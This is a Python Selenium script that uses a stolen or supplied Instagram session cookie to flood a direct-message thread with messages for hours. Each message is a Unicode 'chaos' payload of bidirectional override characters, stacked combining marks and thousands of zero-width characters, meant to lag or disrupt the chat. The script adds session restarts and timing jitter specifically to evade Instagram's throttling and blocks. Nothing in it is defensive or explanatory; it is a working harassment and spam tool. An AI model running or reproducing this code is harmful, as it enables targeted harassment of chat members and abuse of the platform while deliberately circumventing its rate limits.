# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (ANTI-THROTTLE)
# 📅 STATUS: JITTER BURST ENABLED | 10 AGENTS

import os, time, random, threading, sys, gc, tempfile
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- CONFIG ---
THREADS = 2  
TOTAL_DURATION = 21600  
SESSION_LIMIT = 360 # Restart session every 6 mins to clear blocks

GLOBAL_SENT = 0
START_TIME = time.time()
COUNTER_LOCK = threading.Lock()
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def live_logger():
    while True:
        elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - START_TIME))
        with COUNTER_LOCK: current_total = GLOBAL_SENT
        sys.stdout.write(f"\r\033[1;32m[M{MACHINE_ID}] UP: {elapsed} | IMPACT: {current_total} | PAPA POWER 👑\033[0m")
        sys.stdout.flush()
        time.sleep(1)

def get_payload():
    header = "👑 PRAVEER PAPA 👑\n"
    direction_chaos = ("\u202E" + "\u202D") * 70 
    z_tower = "̸" * 60
    bloat = "".join(random.choice(["\u200B", "\u200D"]) for _ in range(2500))
    lines = [header, bloat]
    for _ in range(20):
        lines.append(direction_chaos + "PRAVEER_OWNZ_YOU" + z_tower)
    return "\n".join(lines)

def run_life_cycle(agent_id, cookie, target):
    global GLOBAL_SENT
    while True:
        driver = None
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--window-size=1920,1080")
            driver = webdriver.Chrome(options=chrome_options)
            wait = WebDriverWait(driver, 20)
            
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            
            session_start = time.time()
            burst_counter = 0
            
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[@role='textbox']")))
                    driver.execute_script("arguments[0].focus();", box)
                    driver.execute_script("document.execCommand('insertText', false, arguments[0]);", get_payload())
                    box.send_keys(Keys.ENTER)
                    
                    with COUNTER_LOCK: GLOBAL_SENT += 1
                    burst_counter += 1
                    
                    # ANTI-THROTTLE JITTER
                    if burst_counter >= 50:
                        time.sleep(random.uniform(5, 10)) # Take a breath
                        burst_counter = 0
                    else:
                        time.sleep(random.uniform(0.1, 0.4)) # Standard fast speed
                except:
                    time.sleep(5)
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(2)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    raw_url = os.environ.get("GROUP_URL", "").strip()
    target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
    threading.Thread(target=live_logger, daemon=True).start()
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS): executor.submit(run_life_cycle, i+1, cookie, target_id)

if __name__ == "__main__": main()
